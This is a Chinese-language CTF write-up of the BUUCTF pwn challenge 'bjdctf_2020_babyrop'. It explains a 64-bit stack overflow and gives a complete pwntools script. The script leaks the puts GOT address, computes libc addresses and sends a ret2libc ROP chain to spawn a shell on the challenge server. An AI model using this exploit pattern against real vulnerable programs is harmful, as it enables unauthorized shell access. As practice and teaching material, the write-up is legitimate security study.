---
title: "BUUCTF Pwn Bjdctf_2020_babyrop"
date: 2020-04-15T17:34:23+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn Bjdctf_2020_babyrop

考点

1、64位栈溢出

2、leak地址

4、libc函数地址计算

![image-20200415174427943](/images/image-20200415174427943.png)

![image-20200415173634899](/images/image-20200415173634899.png)

思路

1、栈溢出使用puts_plt来leak出puts_got地址

2、通过puts_got地址来计算基地址，从而计算出system、/bin/sh地址

3、栈溢出getshell

由于puts()函数只需要一个参数，所以只需要pop rdi；ret；这个gadget来传参

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import *
context.log_level = 'debug'
#sh = process('./jarvisoj_level3_x64')
sh = remote('node3.buuoj.cn',29484)
elf = ELF('./bjdctf_2020_babyrop')
libc = ELF('./ubuntu16-x64-libc-2.23.so')

rdi_ret = 0x400733

fakerbp = 0x8
offset = 0x20 + fakerbp
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
vuln_fun = elf.symbols['vuln']

payload1 = 'a'*offset + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_fun)
payload1 += p64(vuln_fun)
sh.sendlineafter("story!\n",payload1)
#u64()函数的参数必须要8字节的字符串，这里puts出的puts_got地址只有6字节，所以需要用ljust方法补到8字节才能被u64()函数执行
puts_addr = u64(sh.recv(6).ljust(8,'\x00'))
print hex(puts_addr)
base_addr = puts_addr - libc.symbols['puts']
system_addr = libc.symbols['system'] + base_addr
binsh_addr = libc.search("/bin/sh").next() + base_addr

payload2 = 'a'*offset + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr)
sh.sendlineafter("story!\n",payload2)
sh.sendline('cat flag')
sh.interactive()
```

![image-20200415174340059](/images/image-20200415174340059.png)